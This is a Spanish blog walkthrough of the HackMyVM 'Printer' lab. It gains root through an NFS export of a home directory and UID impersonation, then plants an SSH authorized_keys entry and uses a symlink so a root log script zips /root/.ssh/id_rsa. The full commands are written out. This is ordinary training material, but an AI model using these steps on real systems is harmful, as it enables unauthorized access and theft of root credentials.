---
layout: post
title: Printer
date: 2023-04-16
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, NFS, UID]
---

# Printer [ Hack My VM ]
![light mode only](/assets/img/imgs/printer/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/printer/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Sun Apr 17 11:54:55 2023 as: nmap -sCV -p22,111,2049,39719,39895,39973,54369 -oN targeted 192.168.1.112
Nmap scan report for 192.168.1.112
Host is up (0.00085s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1896ad8971037f6c8ba1d283ca6f0e56 (RSA)
|   256 a41fbf9b2dccf682781c72bc319f7dfb (ECDSA)
|_  256 6af6fcffe8b862577c684d6ae3f449ce (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35857/udp6  mountd
|   100005  1,2,3      39895/tcp   mountd
|   100005  1,2,3      54036/udp   mountd
|   100005  1,2,3      54135/tcp6  mountd
|   100021  1,3,4      35392/udp6  nlockmgr
|   100021  1,3,4      39719/tcp   nlockmgr
|   100021  1,3,4      44260/udp   nlockmgr
|   100021  1,3,4      45119/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
39719/tcp open  nlockmgr 1-4 (RPC #100021)
39895/tcp open  mountd   1-3 (RPC #100005)
39973/tcp open  mountd   1-3 (RPC #100005)
54369/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:CD:31:C1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 17 11:55:15 2023 -- 1 IP address (1 host up) scanned in 19.77 seconds
```

Vemos que el puerto `22` está abierto, pero no tenemos ningún usuaio para poder conectarnos.

### Inspección
Entre tantos puertos vemos dos que nos llaman la atención: `111` y `2049`, vamos a ver cómo podemos explotarlos.

Primero listaré los servicios `NFS` de la máquina disponibles, esto ya lo hace **NMap**, pero nunca viene mal saberlo hacer de otra manera:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Printer]
└─# rpcinfo -p 192.168.1.112 | grep nfs                                       
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100003    3   udp   2049  nfs
    100227    3   udp   2049  nfs_acl
```

Vemos que los servicios están en el puerto `2049`, de los cuales dos son `UDP` y los otros tres van por `TCP`. Vamos a seguir investigando para descubrir qué podemos hacer.

Vamos a mirar si podemos acceder a alguna carpeta que hayan exportado y, así, ver si hay algún fichero importante:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Printer]
└─# showmount -e 192.168.1.112
Export list for 192.168.1.112:
/home/lisa *
```

¡Wow! Vemos que han compartido el directorio personal de **Lisa**, vamos a montar el directorio en nuestro equipo.

Para comenzar crearemos un directorio, en mi caso lo llamaré `Disco` para identificarlo, por último nos quedará montar en el nuevo directorio:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Printer]
└─# mkdir Disco           

┌──(root㉿kali)-[~/…/VMs/HMV/Printer]
└─# mount -o nolock -t nfs 192.168.1.112:/home/lisa Disco
```

¡Estupendo! Ya tenemos todo listo para continuar.

# Movimiento Lateral
### Shell
Para obtener una `Shell` como **Lisa** debemos primero mirar los permisos de la montura, para ello haremos lo siguiente:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# la -la
total 44
drwxr-xr-x  7 root root 4096 Apr 17 06:41 .
drwxr-xr-x 74 root root 4096 Apr 16 11:48 ..
drwxr-xr-x  2 root root 4096 Apr 16 12:15 content
drwxr-xr-x  4 1098 kali 4096 Jan  8 06:58 Disco
drwxr-xr-x  2 root root 4096 Apr 16 12:07 exploits
drwxr-xr-x  2 root root 4096 Apr 17 06:41 nmap
drwxr-xr-x  2 root root 4096 Apr 16 11:48 scripts
```

Vemos que podemos mirar dentro del directorio, pero no tenemos permisos de escritura en él. Nos llama la atención el número `1098`, éste indica el identificador numérico del usuario propietario del directorio.

Para poder pasar esta protección podemos hacer un ataque conocido como **`UID Impersonation Attack`**. Para poder hacerlo necesitamos crear un usuario con la misma `UID` (`User ID`):

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# useradd -p lisa -s /bin/bash -M -u 1098 hmv

┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# su hmv
hmv@kali:/root/Desktop/VMs/HMV/Printer$
```

¡Bien! Hemos creado un usuario con el `UID 1098`, sigamos desentrañando esta máquina.

Para el siguiente paso necesitamos irnos a la carpeta `/home/lisa/.ssh/`{: .filepath }, si listamos su contenido veremos un fichero:

```sh
hmv@kali:/root/Desktop/VMs/HMV/Printer/Disco/.ssh$ ls -la
total 12
drwx------ 2 hmv kali 4096 Apr 17 07:01 .
drwxr-xr-x 4 hmv kali 4096 Jan  8 06:58 ..
-rw-r--r-- 1 hmv kali  566 Jan  8 06:28 id_rsa.pub
```

No vemos su `id_rsa`, pero no pasa nada, ya que ahora tenemos permisos de escritura y podemos crear un fichero llamado `authorized_keys` con nuestra `id_rsa.pub`.

Primero tendremos que copiarnos nuestra clave pública, para ello haremos lo siguiente:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# cat /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwpYMogBT7ZKSY/ij02vydbpOU7i9OEc7njtlbKg47/xsCZZsmbY6V7p0zVmwhNP9ijV4BwvKCHBl0/RjGfgWY0gLTK1lX3b1cTX171tac7FXkelHEHglu/GhV7NxkGgqpjgEoxzHTHKbIITVMsQ7eTUB21ns0NOGqCDXUSzRLbtg69Gk4aIkXeyvXgOkdWE1tCZdvF4b4TF+t9uCk7lGAeWXffeM/WxjlL1alO6UlksA2fTXaIWwuAMsm+ncjwRZpB6bIGZ4HD1tRqb7skxbRPZTfQp5rYQEYe09ZwiIOWF1k/1B/wc3oAYoyMI2sS0CcBBfGBf2h63uPf7Gvjii+/UUH88XiOrLiApjebrTnP5uNvmD1zDMxVdZx7nJ7QcbJWDbWDkkRlQMAYgn8XDjCYI5O9S7it47KIwsedhI6BJ6N2YsRX+2zzB3UQbJbon8uqLW/20c8wuFTkvkCDwJJ7wdDKA7qz9KlL7uGnnm0pJ/tme3GFaewG0Qi/3rlcys= root@kali
```

Una vez copiada nos iremos de vuelta a la carpeta `/home/lisa/.ssh/`{: .filepath } y crearemos el fichero antes nombrado con nuestra clave dentro:

```sh
hmv@kali:/root/Desktop/VMs/HMV/Printer/Disco/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwpYMogBT7ZKSY/ij02vydbpOU7i9OEc7njtlbKg47/xsCZZsmbY6V7p0zVmwhNP9ijV4BwvKCHBl0/RjGfgWY0gLTK1lX3b1cTX171tac7FXkelHEHglu/GhV7NxkGgqpjgEoxzHTHKbIITVMsQ7eTUB21ns0NOGqCDXUSzRLbtg69Gk4aIkXeyvXgOkdWE1tCZdvF4b4TF+t9uCk7lGAeWXffeM/WxjlL1alO6UlksA2fTXaIWwuAMsm+ncjwRZpB6bIGZ4HD1tRqb7skxbRPZTfQp5rYQEYe09ZwiIOWF1k/1B/wc3oAYoyMI2sS0CcBBfGBf2h63uPf7Gvjii+/UUH88XiOrLiApjebrTnP5uNvmD1zDMxVdZx7nJ7QcbJWDbWDkkRlQMAYgn8XDjCYI5O9S7it47KIwsedhI6BJ6N2YsRX+2zzB3UQbJbon8uqLW/20c8wuFTkvkCDwJJ7wdDKA7qz9KlL7uGnnm0pJ/tme3GFaewG0Qi/3rlcys=" > authorized_keys
hmv@kali:/root/Desktop/VMs/HMV/Printer/Disco/.ssh$ ls -la
total 16
drwx------ 2 hmv kali 4096 Apr 17 07:05 .
drwxr-xr-x 4 hmv kali 4096 Jan  8 06:58 ..
-rw-r--r-- 1 hmv hmv   553 Apr 17 07:05 authorized_keys
-rw-r--r-- 1 hmv kali  566 Jan  8 06:28 id_rsa.pub
```

¡Bien! Ya tenemos todo lo necesario para conectarnos por `SSH` sin necesidad de proporcionar contraseña.

### Subida de privilegios
Ahora que ya estamos como **Lisa** en la máquina debemos conseguir ser `root` y así tener el **control total** de la máquina, para ello comencé por mirar en la carpeta `/opt/`{: .filepath }, me encontré con lo siguiente:

```sh
lisa@printer:/opt$ ls -la
total 12
drwxr-xrwx  3 root root 4096 Apr 16 18:17 .
drwxr-xr-x 18 root root 4096 Jan  7 21:19 ..
drwxr-xr-x  2 root root 4096 Apr 17 13:08 logs
```

```sh
lisa@printer:/opt/logs$ ls -la
total 76
drwxr-xr-x 2 root root  4096 Apr 17 13:08 .
drwxr-xrwx 3 root root  4096 Apr 16 18:17 ..
-rw-r--r-- 1 root root 61574 Apr 16 18:18 journal.zip
-rwxr-xr-x 1 root root   565 Jan  8 12:02 nsecure
```

Vemos que dentro de la carpeta `/opt/logs/`{: .filepath } hay un fichero `Bash`, vamos a ver su funcionamiento:

```bash
#! /bin/bash

dst=/opt/logs
journal=$dst/journal
queued=/var/spool/cups
str="*log*"

touch $journal
chmod 700 $journal
find -L /var/log -type f -name "$str" -exec cp {} $dst  \;
find -L /opt -type f -name "$str" -exec cat {} >> $dst/journal \;
rm $dst/$str

if grep -q "fatal error !" $dst/journal ; then
  umask 007 $queued
  lp -d superPrinter $dst/journal
  umask 022
  zip -P $(<~/.lisaPass) -j $journal.zip $queued/d*
  rm -f $queued/{d*,c*}
  >/var/log/syslog
  >/var/log/user.log
  echo "Lisa, URGENT! Come quickly to fix the problem!" |wall
fi

rm $journal
```

En el penúltimo párrafo del `script`, se realiza una comprobación en el archivo de registro (**`$dst/journal`**) para buscar la cadena **`"fatal error !"`** en el archivo.

Si se encuentra esa cadena, se cambia los permisos de acceso al directorio de cola de impresión (**`$queued`**), se imprime el archivo de registro en la impresora llamada **`"superPrinter"`** y se crea un archivo `ZIP` cifrado con contraseña utilizando la información de inicio de sesión almacenada en el archivo **`~/.lisaPass`**.

Se eliminan ciertos archivos en el directorio de cola de impresión y se limpian los archivos de registro de los registros del sistema y del usuario.

Finalmente, se envía un mensaje urgente a **Lisa** utilizando el comando **wall**.

Ahora que sabemos el funcionamiento del `script` podemos irnos al directorio `/var/spool/cups/`{: .filepath }, allí nos encontraremos dos ficheros:

```sh
lisa@printer:/var/spool/cups$ ls -la
total 36
drwxr-x---+ 3 root lp       4096 Apr 17 13:18 .
drwxr-xr-x  6 root lpadmin  4096 Jan  8 10:21 ..
-rw-r--r--  1 root root     7921 Jan  8 10:33 18358014
-rw-r--r--  1 root root    13699 Jan  8 10:34 21581476
drwxrwx--T  2 root lp       4096 Apr 17 13:18 tmp
```

Vamos a ver qué tipo de ficheros son:

```sh
lisa@printer:/var/spool/cups$ file *
18358014: HP Printer Job Language data
21581476: HP Printer Job Language data
tmp:      sticky, directory
```

Vemos que son dos ficheros `HP Printer Job Language data`, para leer su contenido me descargué los dos documentos a mi máquina para después dirigirme a [CoolUtils](https://www.coolutils.com/es/online/PCL-to-PDF), como no lo quiero en `PDF` seleccioné la opción `Text`.

Una vez convertidos los dos ficheros podemos leerlos sin problema, el que más nos llama la atención es el documento `21581476.txt`:

```
Hi Lisa,

I made a lot of computer changes while you were away.
I have reviewed the way to manage the logs.
And I also changed your password, it's: 1154p455!1
I prefer to print it out for you so that you can destroy the sheet and there will be no trace.

Love
```

Vemos una nota, suponemos que es de `root` ya que le ha dicho que le ha cambiado la contraseña a **`"1154p455!1"`**, un dato bastante importante, la necesitaremos en un rato.

Ahora ya tenemos todo lo necesario para poder explotar el `script` antes encontrado, ahora que tenemos la contraseña de **Lisa** podemos descomprimir el `ZIP` que se creará.

Una vez estemos listos podemos crear un fichero vinculado al `id_rsa` de `root` en la carpeta `/opt/`{: .filepath }:

```sh
lisa@printer:/opt$ ln -s /root/.ssh/id_rsa ./root.id_rsa
lisa@printer:/opt$ ls -la
total 12
drwxr-xrwx  3 root root 4096 Apr 17 13:31 .
drwxr-xr-x 18 root root 4096 Jan  7 21:19 ..
drwxr-xr-x  2 root root 4096 Apr 17 13:31 logs
lrwxrwxrwx  1 lisa lisa   17 Apr 17 13:31 root.id_rsa -> /root/.ssh/id_rsa
```

Perfecto, ahora necesitamos escribir **`"fatal error !"`** en el fichero **`syslog`** para que el `script` sea lanzado, para ello utilizaremos el comando **`logger`**:

```sh
lisa@printer:/opt$ logger "fatal error !"
```

Tras unos segundos de espera deberíamos ver lo siguiente aparecer en la terminal:

```
Broadcast message from root@printer (somewhere) (Mon Apr 17 13:34:01 2023):    
                                                                               
Lisa, URGENT! Come quickly to fix the problem!
```

Si vemos el mensaje significará que ha funcionado, vámonos a la carpeta `/opt/logs`{: .filepath } y descomprimamos el `ZIP` creado en la carpeta `/tmp/`{: .filepath }:

```sh
lisa@printer:/opt/logs$ unzip journal.zip -d /tmp/
Archive:  journal.zip
[journal.zip] d00052-001 password: 1154p455!1
  inflating: /tmp/d00052-001         
```

Vámonos al directorio `/tmp/`{: .filepath } y miremos el contenido del fichero creado:

```sh
lisa@printer:/tmp$ cat d00052-001
[...]
-----BEGIN OPENSSH PRIVATE KEY-----
[...]
-----END OPENSSH PRIVATE KEY-----
```

¡Wow! ¡Es la `id_rsa` de `root`! Vamos a traerla a nuestra máquina, darle los permisos necesarios e iniciar sesión como `root`:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# chmod 600 root.id_rsa

┌──(root㉿kali)-[~/Desktop/VMs/HMV/Printer]
└─# ssh -i root.id_rsa root@192.168.1.112
Linux printer 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 17 18:19:22 2023 from 192.168.1.105
root@printer:~#
```

¡Enhorabuena! Ya estamos como `root` en la máquina. ¡Qué fácil!